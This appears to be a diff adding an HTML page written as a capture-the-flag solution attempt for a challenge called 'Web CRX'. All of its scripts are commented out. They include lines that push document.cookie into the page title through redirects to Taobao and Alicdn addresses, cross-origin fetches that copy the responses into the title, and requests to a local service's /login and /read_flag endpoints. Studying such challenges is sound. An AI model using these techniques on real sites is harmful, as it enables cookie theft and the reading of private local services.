@@ -1,0 +1,88 @@
+<div>
+  <h1>2024</h1>
+  <p>Web CRX</p>
+  I have many secrets. Can you find them?
+</div>
+<image src="https://www.gstatic.com/devrel-devsite/prod/vb596299fc3b3ecd7c5d7aec475be1a412930b770a5f8d074630a8e7a09f63df6/chrome/images/lockup.svg"></image>
+<!-- <script defer async>
+  /**
+   * @param {HTMLElement} e
+   */
+  function visible(e) {
+    console.log(e);
+    try {
+      e.style.display = "block";
+    } catch (err) {
+      console.error(e, err);
+    }
+    for (const child of e.childNodes) {
+      visible(child);
+    }
+  }
+  /**
+   * @param {HTMLElement} e
+   */
+  function click(e) {
+    console.log(e);
+    try {
+      e.click();
+    } catch (err) {
+      console.error(e, err);
+    }
+    for (const child of e.childNodes) {
+      click(child);
+    }
+  }
+  async function main() {
+    visible(document.body);
+    click(document.body);
+    const is = document.getElementsByClassName(
+      "index-module__imgSearch_hover_content--c5JEb"
+    )[0];
+    console.log(is);
+    is.style.display = "block";
+  }
+  main();
+</script> -->
+<!-- <script id="script">
+  // window.location.replace("http://huodong.taobao.com?action=document.title+=document.cookie");
+  // window.location.replace("http://g.alicdn.com/?action=document.title+=document.cookie");
+  // window.location.replace("http://o.alicdn.com/?action=document.title+=document.cookie");
+  async function main() {
+    try {
+      // const req1 = new Request("http://log.mmstat.com/eg.js");
+      const req1 = new Request("http://huodong.taobao.com", {
+        mode: "no-cors",
+      });
+      const res1 = await fetch(req1);
+      document.title += await res1.text();
+    } catch (error) {
+      console.error(error);
+      document.title += error;
+    }
+  }
+  main();
+</script> -->
+<!-- <script
+  async=""
+  crossorigin="anonymous"
+  src="https://log.mmstat.com/eg.js"
+  onload="document.title+='loaded'"
+></script> -->
+
+<!-- <script>
+  async function main() {
+    try {
+      const req1 = new Request("http://127.0.0.1:30000/login");
+      const res1 = await fetch(req1);
+      document.title += await res1.text();
+      const req2 = new Request("http://127.0.0.1:30000/read_flag");
+      const res2 = await fetch(req2);
+      document.title += await res2.text();
+    } catch (error) {
+      console.error(error);
+      document.title += error;
+    }
+  }
+  main();
+</script> -->
